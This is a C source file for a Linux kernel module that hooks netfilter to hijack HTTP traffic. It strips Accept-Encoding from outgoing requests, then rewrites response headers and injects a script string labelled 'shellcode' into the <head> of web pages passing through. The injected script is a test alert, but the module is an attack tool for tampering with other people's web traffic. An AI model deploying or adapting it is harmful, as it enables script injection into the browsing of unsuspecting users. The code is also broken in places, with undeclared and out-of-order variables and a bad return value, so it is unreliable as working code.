#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
// #include <linux/inet.h>
#include <linux/if_packet.h>
// #include <linux/socket.h>
#include <linux/skbuff.h>

#include <net/ip.h>
#include <net/tcp.h>

#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_helper.h>
// #include <net/netfilter/nf_conntrack_expect.h>
#include <net/netfilter/nf_nat.h>
// #include <net/netfilter/nf_nat_core.h>
#include <net/netfilter/nf_nat_helper.h>

char shellcode[] = "<head><script>alert('hijacking test!')</script>";

int delete_accept_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;
	
	pK = strstr(pkg,"Accept: text/html");
	if(pK == NULL)
		return 0;

	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)
		return 0;
	
	printk(KERN_ALERT "hook_ipv4: Accept-Encoding found");
	
	pV = strstr(pK,"\r\n");
	if(pV == NULL)
		return 0;
	
	len = (long long)pV - (long long)pK;
	
	printk(KERN_ALERT "hook_ipv4: Delete Accept-Encoding: %d\n",len);
	
	memset(pK,' ',len + 2);
	return 1;
}

int delete_transfer_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;
	
	pK = strstr(pkg,"Transfer-Encoding:");
	if(pK == NULL)
		return 0;
	
	printk(KERN_ALERT "hook_ipv4: Transfer-Encoding found\n");
	
	pV = strstr(pK,"\r\n");
	if(pV == NULL)
		return 0;
	
	len = (long long)pV - (long long)pK;
	
	
	memset(pK,' ',len + 2);
	// memcpy(pK+18, "identity", 8);

	printk(KERN_ALERT "hook_ipv4: Delete Transfer-Encoding: \n%s\n",pK);

	return 1;
}

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *iph = ip_hdr(skb);
	unsigned short iph_len = ip_hdrlen(skb);
	unsigned short tol_len = ntohs(iph->tot_len);

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
		unsigned int src_ip = (unsigned int)iph->saddr;
		unsigned int dest_ip = (unsigned int)iph->daddr;

		unsigned int src_port = (unsigned int)ntohs(tcph->source);
		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);

		if (0 != skb_linearize(skb)) {
            return NF_ACCEPT;
        }
		// char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
		char *pkg = (char *)skb->data + 40;

		if (src_port == 80)
		{
			if (memcmp(pkg,"HTTP/1.1 200", 12) != 0)
			{
				return NF_ACCEPT;
			}
			enum ip_conntrack_info ctinfo;
			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);


			char *content_len = "Content-Length: 1000";

			pK = strstr(pkg,"Transfer-Encoding:");
			if(pK == NULL)
				return 0;
			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,iph_len,
                                        phead - pkg, 27,
                                        content_len, strlen(content_len))) 
			{
            	printk(KERN_ALERT "\n%s\n",pK);
            }





			char *phead = strstr(pkg,"<head>");
			if(phead == NULL){
				return NF_ACCEPT;
			}
			// delete_transfer_encoding(pkg);

			printk(KERN_ALERT "\n---hook_ipv4: Found Head tag----\n");
			// printk(KERN_ALERT "%s\n",phead);
			// sudo iptables -t nat --list
			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,iph_len,
                                        phead - pkg, 6,
                                        shellcode, strlen(shellcode))) 
			{
             //    skb->local_df = 1;
            	// skb_shinfo(skb)->gso_size = 0;
                printk("insert success\n");
            }
		}
		else if (dest_port == 80)
		{
			if (memcmp(pkg,"GET",strlen("GET")) != 0)
			{
				return NF_ACCEPT;
			}
			
			delete_accept_encoding(pkg);
		}
		// unsigned short cs = checksum_tcp(iph, tcph);
		// tcph->check = cs;
		struct rtable *rt = skb_rtable(skb);
		//计算校验和，参考内核源码 的net/ipv4/tcp_ipv4.c tcp_v4_send_check函数
        //和net/ipv4/netfilter/nf_nat_helper.c nf_nat_mangle_tcp_packet 函数
                        //和net/netfilter/xt_TCPMSS.c 的 tcpmss_mangle_packet 函数
        int datalen = skb->len - iph->ihl * 4;
        int oldlen = datalen - 9;
        if (skb->ip_summed != CHECKSUM_PARTIAL) {
            if (!(rt->rt_flags & RTCF_LOCAL) && skb->dev->features
                    & NETIF_F_V4_CSUM) {
                skb->ip_summed = CHECKSUM_PARTIAL;
                skb->csum_start = skb_headroom(skb)
                        + skb_network_offset(skb) + iph->ihl * 4;
                skb->csum_offset = offsetof(struct tcphdr, check);
                tcph->check = ~tcp_v4_check(datalen, iph->saddr,
                        iph->daddr, 0);
            } else {
                tcph->check = 0;
                tcph->check = tcp_v4_check(datalen, iph->saddr,
                        iph->daddr, csum_partial(tcph, datalen, 0));
            }
        } else
            inet_proto_csum_replace2(&tcph->check, skb, htons(oldlen),
                    htons(datalen), 1);
	}
	return NF_ACCEPT;
}

static struct nf_hook_ops http_hooks = 
{ 
	.pf = NFPROTO_IPV4,
    .priority = NF_IP_PRI_MANGLE, 
    .hooknum = NF_INET_POST_ROUTING, 
    .hook = hook_func,
};

int init_module(void)
{
	nf_register_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

void cleanup_module(void)
{
	nf_unregister_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}
